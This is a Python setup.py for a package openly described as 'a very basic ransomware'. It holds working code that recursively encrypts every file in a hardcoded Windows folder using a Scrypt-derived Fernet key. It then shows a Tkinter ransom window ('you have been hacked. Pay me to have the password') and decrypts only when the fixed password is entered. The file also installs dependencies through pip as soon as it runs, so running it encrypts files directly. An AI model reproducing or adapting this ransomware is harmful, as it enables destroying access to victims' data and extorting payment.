from setuptools import setup, find_packages
import sys
import subprocess
import tkinter as tk
from tkinter import *
from tkinter import messagebox
subprocess.check_call([sys.executable, '-m', 'pip', 'install',
'Pillow'])
from PIL import Image, ImageTk



# implement pip as a subprocess:
subprocess.check_call([sys.executable, '-m', 'pip', 'install',
'schedule'])
import time
import schedule
import pathlib
import secrets
import os
import base64
import getpass

subprocess.check_call([sys.executable, '-m', 'pip', 'install',
'cryptography'])
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

classifiers = [
    'Development Status :: 5 - Production/Stable',
    'Intended Audience :: Education',
    'Operating System :: Microsoft :: Windows :: Windows 10',
    'License :: OSI Approved :: MIT License',
    'Programming Language :: Python :: 3'
]

setup(
    name='Ace_chenini',
    version='0.0.1',
    description='A very basic ransomware',
    long_description=open('README.txt').read() ,
    url='',
    author='Tasdrago',

    license='MIT',
    classifiers=classifiers,
    keywords='ransomware',
    packages=find_packages(),
    install_requires=['']
)


def generate_salt(size=16):
    """Generate the salt used for key derivation,
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)


def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())


def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()


def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)


def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)


def encrypt_folder(foldername, key):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)


def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)


def decrypt_folder(foldername, key):
    # if it's a folder, decrypt the entire folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key)





def hide_widget():
   label.pack_forget()









def display_text():
    value = entry.get()
        #print ("value = ", value)


    if value != "123":
        label.configure(text="hhh, nice try :) But wrong! I said pay me !")

            # NumberOfFiles = len(os.listdir(r"C:\Users\hp\OneDrive\Bureau\ace-4\test"))
            # time.sleep(1)
            # OldNumber = NumberOfFiles
            # NumberOfFiles = len(os.listdir(r"C:\Users\hp\OneDrive\Bureau\ace-4\test"))
            # if NumberOfFiles != OldNumber:
            #    password = "123"
            #    key = generate_key(password, load_existing_salt=True)
            #    decrypt_folder(foldername, key)
            #    key = generate_key(password, salt_size=32, save_salt=True)
            #    encrypt_folder(foldername, key)




    else:
        label.configure(text="thank you for the payment, until my next ransomware")
        global given_password
        given_password = True
        key = generate_key(password, load_existing_salt=True)
        decrypt_folder(foldername, key)
            #b1 = Button(root, text="okay", command=root.destroy)
            #b1.pack(pady=10)
            #b1 = tk.Button(root, text="Okay", width=20, command=hide_widget)
            #b1.pack_forget()
        print("given password -1 = ", given_password)
        return None







if __name__ == "__main__":
    password = "123"

    given_password = False
    foldername = r"C:\Users\hp\OneDrive\Bureau\ace-4\test"
    key = generate_key(password, salt_size=32, save_salt=True)
    encrypt_folder(foldername, key)
    root = tk.Tk()
    root.geometry("1000x250")
    root.title('Ace')
    ico = Image.open('one_piece_logo.jpg')
    photo = ImageTk.PhotoImage(ico)
    root.wm_iconphoto(False, photo)

    ico = ico.resize((1000, 250))
    bg = ImageTk.PhotoImage(ico)
    label1 = Label(root, image=bg)
    label1.place(x=0, y=0)

            # Initialize a Label to display the User Input
    label = Label(root, text="hhhh, you have been hacked. Pay me to have the password ",
                          font=("Courier 10 bold"))
    label.pack()
    global entry
    global value

            # Create an Entry widget to accept User Input
    entry = Entry(root, width=40)
    entry.focus_set()
    entry.pack()

        # Create a Button to validate Entry Widget
   # tk.Button(root, text="Okay", width=20, command=display_text).pack(pady=20)

    b1= tk.Button(root, text="Okay", width=20, command=display_text).pack(pady=20)
    print("given password 0 = ", given_password)
    #if given_password == True:
        #break

    #if given_password == True:
    print("given password = ", given_password)






    root.mainloop()





